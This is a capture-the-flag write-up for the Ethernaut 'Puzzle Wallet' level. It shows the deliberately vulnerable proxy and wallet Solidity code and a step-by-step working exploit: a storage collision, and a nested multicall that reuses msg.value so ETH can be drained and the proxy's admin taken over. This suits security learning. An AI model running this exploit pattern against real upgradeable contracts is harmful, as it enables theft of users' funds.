# Ethernaut 24: Puzzle Wallet

Learn how to work with more realistic code. Here we have an obvious vulnerability in storage, but to exploit it, a small chain of tasks is necessary that exploits another not so obvious vulnerability.

## The Task Intro

Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.

Move on to the next level when you're ready!

## The Task Code

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## The Solution

This level was much harder then the previous ones. The first vulnerability was clear after first sight: We have a Proxy contract and an implementation contract that do not match in Storage. Calls made on the proxy override values on the implementation and vice virca. I know that the storage is stored on the Proxy and the logic does not contain any data - if we stick to the delegatecall pattern.

It is obvious to make the me first owner of the implementation. Why is this important? Only whitelisted users can interact with the implementation. For being whitelisted I have to be the owner. The attack makes first the attacker as an owner of the implementation by calling `proposeNewAdmin(address _newAdmin)`. This sets the pendingAdmin variable, but in a delegate call an owner address is expected here, therefore I am the owner of implemntation now, when I use a delegate call, next set is to whitelist me with `addToWhitelist`

Second step of the attack is to become the admin of the proxy contract. This is not possible through the proxy, if we could set the storage slot 1 through a delegatecall to my address, I would be owner. The variable there is `maxBalance`. `MaxBalance` is set through 2 functions: 1 `init` or `setMaxBalance`. Init seems impossible to set maxBalance, because it require `maxBalance == 0`, and it is already set to a non-zero value. `setMaxBalance`seems a way to follow, but it requires that the contract has a zero eth balance, currently it has a 0.001 eth balance.

Before we can set the maxBalance, we need to drain all eth out of the contract. I can use the `execute` function for this. This requires that I have a balances[myaddress]>=than the value. So a possible attack is to artifically rise my balance but not giving that much eth to the contract.

Calling deposit multiple times does not work because it asks each time the same value of eth. But what if in the same call I could make several calls to deposit, using the same msg.value several time? Obvious candidate is the multicall function.

This function has a simple flag check in it, only allowing one call to the deposit function, which seems safe. But hey, thinking it twice, this function allows to make multiple call, why not another multicall that contains a deposit? In this case the flag test would pass again and I can manipulate the balance - a hidden vulnerability.

After this exploit, I can retrieve all eth from the contract and set maxBalance to my address. With this I am the owner of the proxy 👍. Technically I switched between solidity and web3 calls, here my implementation:

````apache
1. Get owner of the implementation
contract.abi
Array(10) [ {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…} ]
0: Object { name: "addToWhitelist", stateMutability: "nonpayable", type: "function", … }
1: Object { name: "balances", stateMutability: "view", type: "function", … }
2: Object { name: "deposit", stateMutability: "payable", type: "function", … }
3: Object { name: "execute", stateMutability: "payable", type: "function", … }
4: Object { name: "init", stateMutability: "nonpayable", type: "function", … }
5: Object { name: "maxBalance", stateMutability: "view", type: "function", … }
6: Object { name: "multicall", stateMutability: "payable", type: "function", … }
7: Object { name: "owner", stateMutability: "view", type: "function", … }
8: Object { name: "setMaxBalance", stateMutability: "nonpayable", type: "function", … }
9: Object { name: "whitelisted", stateMutability: "view", type: "function", … }
```
````

Unfortunately the method proposeNew admin is not there, I switched therefore to Remix, and with this I was the owner.

```apache
    address public proxy = 0x1;
    address public wallet = 0x1;

   function attack() public {
       bytes memory calldatas = abi.encodeWithSignature("proposeNewAdmin(address)",msg.sender);
       (bool success, ) = proxy.call(calldatas);
       if(!success){
           revert();
       }
   }
```

As immediate next step I whitelist me throught the browser console, so I am allowed to interact with the contract and fulfill the require from the onlyWhitelisted modifier.

```àppache
// whitelist the owner
await contract.addToWhitelist(player)
```

After this task, I am the owner of the implementation contract but now the admin of the proxy. For this the next step is to drain all eth out of the contract with a nested multicall.

```apache
// set the deposit function selector
let depositSelector = web3.eth.abi.encodeFunctionCall(contract.abi[2], [] )

// set the multicall selector with a nested deposit call
let multicallSelector = web3.eth.abi.encodeFunctionCall(contract.abi[6], [[depositSelector]])

// make the nested multicall
await web3.eth.sendTransaction({
    from: "myAddress",
    to: contract.address,
    data: web3.eth.abi.encodeFunctionCall(contract.abi[6], [[depositSelector, multicallSelector]]),
    value:  web3.utils.toWei('0.001', 'ether')
})


```

After this I can exploit all eth with `execute` and finally set me as proxy admin with `setMaxBalance`.

````apache
// get the eth
await contract.execute("myAddress", web3.utils.toWei('0.002', 'ether'),[])

// setMaxBalance - interestingly no casting is necessary :-)
await contract.setMaxBalance("myAddress")
```
````

Done 🎉️. This was a difficult task, especally to see the second vulnerability and exploit it correctly with abi encoding was time consuming, but finally as always solvable.
